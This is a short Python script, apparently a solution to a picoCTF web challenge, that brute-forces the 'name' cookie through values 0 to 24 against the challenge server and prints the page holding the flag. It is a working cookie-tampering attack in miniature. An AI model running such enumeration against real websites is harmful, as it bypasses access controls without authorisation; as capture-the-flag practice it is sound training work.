import requests

url = 'http://mercury.picoctf.net:27177/check'

for i in range(0, 25):
    cookies = {'name': f'{i}'}

    r = requests.get(url, cookies=cookies)

    if r.status_code == 200 and 'picoCTF' in r.text:
        print(r.text)
